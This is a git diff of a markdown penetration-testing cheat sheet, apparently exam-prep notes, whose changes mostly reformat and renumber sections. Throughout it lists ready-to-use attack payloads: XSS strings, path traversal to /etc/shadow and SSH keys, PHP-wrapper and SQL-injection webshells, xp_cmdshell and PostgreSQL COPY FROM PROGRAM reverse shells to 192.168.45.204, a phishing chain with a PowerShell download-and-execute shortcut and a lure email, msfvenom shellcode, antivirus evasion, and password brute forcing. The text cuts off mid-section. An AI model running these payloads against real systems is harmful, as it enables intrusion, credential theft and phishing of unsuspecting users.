@@ -145,7 +145,8 @@
 	`wpscan --url http://192.168.44.30:12380 --verbose`	
 
 	d. API endpoints:
-	`gobuster dir -u http://192.168.44.30/ -w /usr/share/wordlists/dirb/big.txt -p pattern`
+	
+ 	`gobuster dir -u http://192.168.44.30/ -w /usr/share/wordlists/dirb/big.txt -p pattern`
 
 	 pattern: {GOBUSTER}/v1, {GOBUSTER}/v2, etc. separated by newlines
 
@@ -160,28 +161,40 @@
 	`curl -i <endpoint> -H 'Authorization: OAuth <token>'`
 
 3. XSS:
-	a. Enumeration:
-	Fuzz input fields with: `< > ' " { } ;`
+	
+ 	a. Enumeration:
+	
+ 	Fuzz input fields with: `< > ' " { } ;`
 
 	`<svg onload=alert('XSS')>`
-    `<img src=x onerror=alert(1) />`
+
+   	`<img src=x onerror=alert(1) />`
 
 	WordPress Core XSS can lead to new admin user + code execution
 
-4. Directory/Path Traversal:
-	`curl --path-as-is http://example.com/cms/login.php?language=../../../../.etc/passwd`
+5. Directory/Path Traversal:
+	
+ 	`curl --path-as-is http://example.com/cms/login.php?language=../../../../.etc/passwd`
 
 	files to look for:
-		- /etc/passwd
-		- /etc/shadow
-		- /home/john/.ssh/id_ed25519, id_ecdsa, id_dsa, etc.
-		- C:\\Windows\\System32\\drivers\\etc\\hosts
-		- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
-		- C:\\inetpub\\wwwroot\\web.config\\
+	
+  	- /etc/passwd
+	
+  	- /etc/shadow
+	
+  	- /home/john/.ssh/id_ed25519, id_ecdsa, id_dsa, etc.
+	
+  	- C:\\Windows\\System32\\drivers\\etc\\hosts
+	
+  	- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
+	
+  	- C:\\inetpub\\wwwroot\\web.config\\
 
-5. File inclusions:
-	1. LFI: 
-		enumerate service and version for known file inclusion vulnerabilities
+6. File inclusions:
+	
+ 	1. LFI: 
+	
+  		enumerate service and version for known file inclusion vulnerabilities
 
 		enumerate parameters that take file names as input to include /etc/passwd or C:\\Windows\\System32\\drivers\\etc\\hosts (or index.php base64-encoded)
 
@@ -190,181 +203,328 @@
 		use php wrappers to include arbitrary plain or base64 encoded PHP snippets or PHP files themselves as shown below.	
 
 	2. RFI:
-		enumerate service and version for known remote file inclusion vulnerabilities
+		
+  		enumerate service and version for known remote file inclusion vulnerabilities
 
 		`python3 -m http.server 80`
 
 		`curl "http://mountaindesserts.com/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=ls"`
 
 	3. PHP Wrappers:
-		1.`http://domain.com/index.php?page=php://filter/resource=localFile.php`
-		2.`http://domain.com/index.php?page=php://filter/convert.base64-encode/resource=localFile.php`
-		3.`http://domain.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
-		4. 
-		   `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
-		   `curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"`
-		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
-		6. `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"`
+		
+  		1.`http://domain.com/index.php?page=php://filter/resource=localFile.php`
+		
+  		2.`http://domain.com/index.php?page=php://filter/convert.base64-encode/resource=localFile.php`
+		
+  		3.`http://domain.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
+		
+  		4. 
+		
+     			`echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
+		   
+     			`curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"`
+		
+  		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
+		
+  		6. `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"`
 
-6. File Upload Vulnerabilities:
-	1. security check bypasses:
-		1. .PHP, .pHP
-			1. [A list of valid PHP extensions from fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)
-		2. file.php%00
-		3. .txt.php
-		4. intercepting the request after submission and modifying the extension/changing the body, etc.
-		5. changing the file's magic number
-		6. if you can't upload executables, overwrite SSH keys
-		7. intercept the file and make it reference an instance of impacket-smbserver/ntlmrelayx to grab or relay the hash
+7. File Upload Vulnerabilities:
+	
+ 	1. security check bypasses:
+	
+  		1. .PHP, .pHP
+		
+   			1. [A list of valid PHP extensions from fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)
+		
+  		2. file.php%00
+		
+  		3. .txt.php
+		
+  		4. intercepting the request after submission and modifying the extension/changing the body, etc.
+		
+  		5. changing the file's magic number
+		
+  		6. if you can't upload executables, overwrite SSH keys
+		
+  		7. intercept the file and make it reference an instance of impacket-smbserver/ntlmrelayx to grab or relay the hash
 
-7. Command Injection:
-	1. fuzz input fields with `& && ; |` \` 
+8. Command Injection:
+	
+ 	1. fuzz input fields with `& && ; |` \` 
 
 **SQL Injection:**
-1. identify and fuzz all parameters taken by the application in both GET and POST requests
-2. Fuzzing:
-	2. `' OR 1=1-- .`
-	3. `' ORDER BY 1-- .`
-	4. `%' UNION SELECT database(), user(), @@version, null, null -- .`
-	5. `' AND 1=2-- .`
-	6. `' AND IF (1=1, sleep(3), 'false') -- .`
+
+	1. identify and fuzz all parameters taken by the application in both GET and POST requests
+
+	2. Fuzzing:
+		
+  		2. `' OR 1=1-- .`
+		
+  		3. `' ORDER BY 1-- .`
+		
+  		4. `%' UNION SELECT database(), user(), @@version, null, null -- .`
+		
+  		5. `' AND 1=2-- .`
+		
+  		6. `' AND IF (1=1, sleep(3), 'false') -- .`
+
 3. MySQL Basics:
-	1. `select version();`
-	2. `select system_user();`
-	3. `show databases;`
-	4. `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
+
+ 	1. `select version();`
+	
+ 	2. `select system_user();`
+	
+ 	3. `show databases;`
+	
+ 	4. `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
+
 4. MS-SQL Basics:
-	1. `impacket-mssqlclient Administrator:Password1#@192.168.44.30 -windows-auth`
-	2. `SELECT @@version;`
-	3. `SELECT name FROM sys.databases;`
-	4. `SELECT * FROM <table-name>.information_schema.tables;`
-	5. `select * from sysusers;`
-	6. `SELECT * FROM <database-name>.dbo.<table-name>;`
+
+ 	1. `impacket-mssqlclient Administrator:Password1#@192.168.44.30 -windows-auth`
+	
+ 	2. `SELECT @@version;`
+	
+ 	3. `SELECT name FROM sys.databases;`
+	
+ 	4. `SELECT * FROM <table-name>.information_schema.tables;`
+	
+ 	5. `select * from sysusers;`
+	
+ 	6. `SELECT * FROM <database-name>.dbo.<table-name>;`
+
 5. Error-Based Payloads:
-	1. Fuzz with `' ; " -- .` appended to legitimate input
-	2. `username' OR 1=1-- .`
-	3. `username' OR 1=1 in (select @@version) -- .`
-	4. `username' OR 1=1 in (select * from users)-- .`
-	5. `username' OR 1=1 in (select password from users)-- .`
-	6. `username' OR 1=1 in (select password from users where username = 'admin')-- .`
+
+ 	1. Fuzz with `' ; " -- .` appended to legitimate input
+	
+ 	2. `username' OR 1=1-- .`
+	
+ 	3. `username' OR 1=1 in (select @@version) -- .`
+	
+ 	4. `username' OR 1=1 in (select * from users)-- .`
+	
+ 	5. `username' OR 1=1 in (select password from users)-- .`
+	
+ 	6. `username' OR 1=1 in (select password from users where username = 'admin')-- .`
+
 6. UNION-based payloads:
-	1. `' ORDER BY 1-- .`      (try with 1,2,3,4,5,6 etc.; an error will be returned when the number surpasses the number of columns)
-	2. `%' UNION SELECT database(), user(), @@version, null, null -- .`
-	3. `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns WHERE table_schema=database() -- .`        (tables and columns of the current database)
-	4. `' UNION SELECT null, username, password, description, null FROM users -- .`
+
+ 	1. `' ORDER BY 1-- .`      (try with 1,2,3,4,5,6 etc.; an error will be returned when the number surpasses the number of columns)
+	
+ 	2. `%' UNION SELECT database(), user(), @@version, null, null -- .`
+	
+ 	3. `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns WHERE table_schema=database() -- .`        (tables and columns of the current database)
+	
+ 	4. `' UNION SELECT null, username, password, description, null FROM users -- .`
+
 7. Blind SQL injection payloads:
-	1. `http://domain.com/index.php?user=offsec' AND 1=1 -- .`            (boolean based)
-	2. `http://domain.com/index.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- .`         (time-based; this will sleep if the user exists and return false (no sleep) if the user does not exist)
+
+ 	1. `http://domain.com/index.php?user=offsec' AND 1=1 -- .`            (boolean based)
+	
+ 	2. `http://domain.com/index.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- .`         (time-based; this will sleep if the user exists and return false (no sleep) if the user does not exist)
+
 8. SQLi to RCE:
-	1. MS-SQL (xp_cmdshell()):
-		1. `EXECUTE sp_configure 'show advanced options', 1;`
-		2. `RECONFIGURE;`
-		3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
-		4. `RECONFIGURE;`
-		5. `EXECUTE xp_cmdshell 'whoami';`
-	2. MySQL (SELECT INTO OUTFILE):
-		1. `username' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- .`          (number of columns must be exact; this payload can return an error even on success; payload must be written into an accessible directory)
+
+ 	1. MS-SQL (xp_cmdshell()):
+	
+  		1. `EXECUTE sp_configure 'show advanced options', 1;`
+		
+  		2. `RECONFIGURE;`
+		
+  		3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
+		
+  		4. `RECONFIGURE;`
+		
+  		5. `EXECUTE xp_cmdshell 'whoami';`
+	
+ 	2. MySQL (SELECT INTO OUTFILE):
+	
+  		1. `username' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- .`          (number of columns must be exact; this payload can return an error even on success; payload must be written into an accessible directory)
+
 9. Payloads used during practice:
-	1. MySQL SQLi to RCE:
-		1. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/test.php' FIELDS TERMINATED BY '<?php phpinfo();?>'; -- +`           (test writing to an accessible file)
-		2. `' UNION SELECT @,@,@,@,@; -- +`          (confirm number of columns)
-		3. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]);?>'; -- +`          (write the webshell)
-	2. PostgreSQL blind time-based SQLi to RCE:
-		1. [RCE via PostgreSQLi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
-		2. `weight=4&height=4'%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+--+%2b&age=2'&gender=Male'&email=test%40test.com'`             (create the table)
-		3. `weight=4&height=4'%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http%3a//192.168.45.204%3a8082/test.txt'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`            (try to pull down an arbitrary file from the attacker)
-		4. `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%30%34%2f%34%34%34%34%20%30%3e%26%31%22'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`          
-			1. (execute a bash reverse shell; the encoded snippet is: `bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"';--+`)
-			2. unencoded exploit: `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`
-	3. MS-SQLi to RCE:
-		1. [MSSQL injection to RCE](https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
-		2. `test' UNION SELECT @@version, null;-- -`     
-			1. (correct number of columns will not return an error)
-		3. `test'; waitfor delay '0:0:10'-- -`             (enumerate time-based injection)
-		4. `admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+` 
-		5. `admin' UNION SELECT 1,2; RECONFIGURE--+`
-		6. `admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+`
-		7. `admin' UNION SELECT 1,2; RECONFIGURE--+`
-		8. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/test.txt'-- -`
-		9. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/webshell.aspx c:\\inetpub\\wwwroot\webshell.aspx'-- -`
+
+ 	1. MySQL SQLi to RCE:
+	
+  		1. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/test.php' FIELDS TERMINATED BY '<?php phpinfo();?>'; -- +`           (test writing to an accessible file)
+		
+  		2. `' UNION SELECT @,@,@,@,@; -- +`          (confirm number of columns)
+		
+  		3. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]);?>'; -- +`          (write the webshell)
+	
+ 	2. PostgreSQL blind time-based SQLi to RCE:
+	
+  		1. [RCE via PostgreSQLi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
+		
+  		2. `weight=4&height=4'%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+--+%2b&age=2'&gender=Male'&email=test%40test.com'`             (create the table)
+		
+  		3. `weight=4&height=4'%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http%3a//192.168.45.204%3a8082/test.txt'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`            (try to pull down an arbitrary file from the attacker)
+		
+  		4. `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%30%34%2f%34%34%34%34%20%30%3e%26%31%22'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`          
+		
+   			1. (execute a bash reverse shell; the encoded snippet is: `bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"';--+`)
+			
+   			2. unencoded exploit: `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`
+	
+ 	3. MS-SQLi to RCE:
+	
+  		1. [MSSQL injection to RCE](https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
+		
+  		2. `test' UNION SELECT @@version, null;-- -`     
+		
+   			1. (correct number of columns will not return an error)
+		
+  		3. `test'; waitfor delay '0:0:10'-- -`             (enumerate time-based injection)
+		
+  		4. `admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+` 
+		
+  		5. `admin' UNION SELECT 1,2; RECONFIGURE--+`
+		
+  		6. `admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+`
+		
+  		7. `admin' UNION SELECT 1,2; RECONFIGURE--+`
+		
+  		8. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/test.txt'-- -`
+		
+  		9. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/webshell.aspx c:\\inetpub\\wwwroot\webshell.aspx'-- -`
 
 **Client Side Attacks:**
+
 1. `gobuster dir -u "http://192.168.241.199/" -x .pdf,.docx,.pptx -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`
+
 2. `exiftool -a -u filename.pdf`
+
 3. [reverse shell macro to put into an office document](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/macro.vba)
+
 4. [Windows library file/shortcut file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms):
-	1. `mkdir /home/kali/webdav/ && pip3 install wsgidav`
-	2. `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
-	3. save the [Windows library file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms) as config.Library-ms
-	4. craft a shortcut file (shortcut.lnk) on Windows with the path being: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8082/powercat.ps1');powercat -c 192.168.45.204 -p 4444 -e powershell"`
-	5. serve the .lnk and .Library-ms files in `/home/kali/webdav`
-	6. serve [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) on port 8082
-	7. `swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --auth-user test@supermagicorg.com --server supermagicorg.com --body 'Please open the attached file promptly.' --attach @/home/kali/webdav/config.Library-ms`
+
+ 	1. `mkdir /home/kali/webdav/ && pip3 install wsgidav`
+	
+ 	2. `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
+	
+ 	3. save the [Windows library file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms) as config.Library-ms
+	
+ 	4. craft a shortcut file (shortcut.lnk) on Windows with the path being: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8082/powercat.ps1');powercat -c 192.168.45.204 -p 4444 -e powershell"`
+	
+ 	5. serve the .lnk and .Library-ms files in `/home/kali/webdav`
+	
+ 	6. serve [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) on port 8082
+	
+ 	7. `swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --auth-user test@supermagicorg.com --server supermagicorg.com --body 'Please open the attached file promptly.' --attach @/home/kali/webdav/config.Library-ms`
 
 
 **Locating Public Exploits:**
+
 1. `searchsploit -m windows/remote/34534.rb`
+
 2. `searchsploit -p 34544`
+
 3. `grep exploit /usr/share/nmap/scripts/*.nse`
+
 4. `nmap --script-help=clamav-exec.nse`
+
 5. lab 1:
-	1. `cewl -d 3 -w wordlist.txt --with-numbers -e http://10.0.0.174/`
-	2. `ffuf -request request.txt -request-proto http -w wordlist.txt:PASSFUZZ`         (PASSFUZZ is placed as parameter in request.txt)
-	3. `curl --data-urlencode "cmd=nc -e /bin/bash 192.168.45.204 4444" http://10.0.0.174/project/uploads/users/34535-backdoor.php`
+
+ 	1. `cewl -d 3 -w wordlist.txt --with-numbers -e http://10.0.0.174/`
+	
+ 	2. `ffuf -request request.txt -request-proto http -w wordlist.txt:PASSFUZZ`         (PASSFUZZ is placed as parameter in request.txt)
+	
+ 	3. `curl --data-urlencode "cmd=nc -e /bin/bash 192.168.45.204 4444" http://10.0.0.174/project/uploads/users/34535-backdoor.php`
 
 
 **Fixing Public Exploits:**
+
 1. `msfvenom --arch x86 -p windows/shell/reverse_tcp LPORT=4444 LHOST=192.168.45.204 -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread -f c -e x86/shikata_ga_nai`
+
 2. `requests.post(url, data=data, allow_redirects=False, verify=False)`        (verify=False will allow you to overlook self signed certificates)
 
 
 **Antivirus Evasion:**
+
 1. [injecting shellcode into memory via powershell](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/ObfuscatedInMemoryInjection.ps1)
+
 2. using shellter:
-	1. `sudo apt install wine && dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
-	2. `shellter`
+
+ 	1. `sudo apt install wine && dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
+	
+ 	2. `shellter`
+
 3. bypassing Avira with a batch file:
-	1. `impacket-smbserver -smb2support share .`
-	2. upload/send [BatchReverseShell.bat](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/BatchReverseShell.bat) to the victim
-	3. `nc -nvlp 4444`
+
+ 	1. `impacket-smbserver -smb2support share .`
+	
+ 	2. upload/send [BatchReverseShell.bat](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/BatchReverseShell.bat) to the victim
+	
+ 	3. `nc -nvlp 4444`
 
 
 **Brute Forcing:**
+
 1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.0.0.174`
+
 2. `hydra -L usernames.txt -p "Password1#" rdp://10.0.0.174`
+
 3. brute forcing POST login forms with hydra:
-	1. grab authentication request body via Burp
-	2. identify the "condition string" (a string in the response to a failed authentication attempt that indicates failure)
-	3. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-post-form "/login.php:param1:^USER^&param2=^PASS^:Login failed. Invalid}"`
-		1. `"</form.php>:<parameters-and-their-significance>:<condition-string>"`
+
+ 	1. grab authentication request body via Burp
+	
+ 	2. identify the "condition string" (a string in the response to a failed authentication attempt that indicates failure)
+	
+ 	3. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-post-form "/login.php:param1:^USER^&param2=^PASS^:Login failed. Invalid}"`
+	
+  		1. `"</form.php>:<parameters-and-their-significance>:<condition-string>"`
+
 4. [brute forcing POST login forms with ffuf](https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login):
-	1. capture the authentication request using burp and save it as request.txt
-	2. replace parameters with USERFUZZ and PASSFUZZ as needed in request.txt
-	3. `ffuf -request request.txt -request-proto http -mode clusterbomb -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:USERFUZZ /usr/share/wordlists/rockyou.txt:PASSFUZZ -mc 200`
-		1. define status code 200 as successful login (`-mc 200`)
+
+ 	1. capture the authentication request using burp and save it as request.txt
+	
+ 	2. replace parameters with USERFUZZ and PASSFUZZ as needed in request.txt
+	
+ 	3. `ffuf -request request.txt -request-proto http -mode clusterbomb -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:USERFUZZ /usr/share/wordlists/rockyou.txt:PASSFUZZ -mc 200`
+	
+  		1. define status code 200 as successful login (`-mc 200`)
+
 5. brute forcing basic HTTP authentication:
-	1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-get /`
+
+ 	1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-get /`
 
 
 **Password/Hash Cracking:**
+
 - Methodology:
-	- 1. recover hash/protected material
-	- 2. convert data to crackable format using \*2john 
-	- 3. calculate cracking duration if needed
-	- 4. identify proper wordlist and craft a ruleset
-	- 5. run the cracking tool in a suitable environment (GPU for hashcat, CPU for john)
+
+ 	- 1. recover hash/protected material
+
+  	- 2. convert data to crackable format using \*2john 
+
+  	- 3. calculate cracking duration if needed
+
+  	- 4. identify proper wordlist and craft a ruleset
+
+  	- 5. run the cracking tool in a suitable environment (GPU for hashcat, CPU for john)
+
 1. Hashcat rules:
-	1. `$3`       (append 3 to all words)
-	2. `^3`       (prepend 3 to all words)
-	3. `c`         (capitalize the first letter, lowercase the rest)
-	4. `hashcat -r demo.rule --stdout wordlist.txt`
-	5. `$1 $2 c`       (Password12)
-		1. rules are applied on a per-line bases; rules will be applied mutually exclusively unless specified on the same line
-	6. Common rules: `$1 c $!`      `$2 c $!`       `$1 $2 $3 c $!`
-	7. Common pre-made rules:
-		1. `/usr/share/hashcat/rules/rockyou-3000.rule`
-		2. `/usr/share/hashcat/rules/best64.rule`
-	8. `hashcat -m 1000 hash.ntlm /usr/share/wordlists/rockyou.txt -r rule.rule`
+
+ 	1. `$3`       (append 3 to all words)
+	
+ 	2. `^3`       (prepend 3 to all words)
+	
+ 	3. `c`         (capitalize the first letter, lowercase the rest)
+	
+ 	4. `hashcat -r demo.rule --stdout wordlist.txt`
+	
+ 	5. `$1 $2 c`       (Password12)
+	
+  		1. rules are applied on a per-line bases; rules will be applied mutually exclusively unless specified on the same line
+	
+ 	6. Common rules: `$1 c $!`      `$2 c $!`       `$1 $2 $3 c $!`
+	
+ 	7. Common pre-made rules:
+	
+  		1. `/usr/share/hashcat/rules/rockyou-3000.rule`
+		
+  		2. `/usr/share/hashcat/rules/best64.rule`
+	
+ 	8. `hashcat -m 1000 hash.ntlm /usr/share/wordlists/rockyou.txt -r rule.rule`
+
 2. John rules:
 ```
 [List.Rules:sshRules]
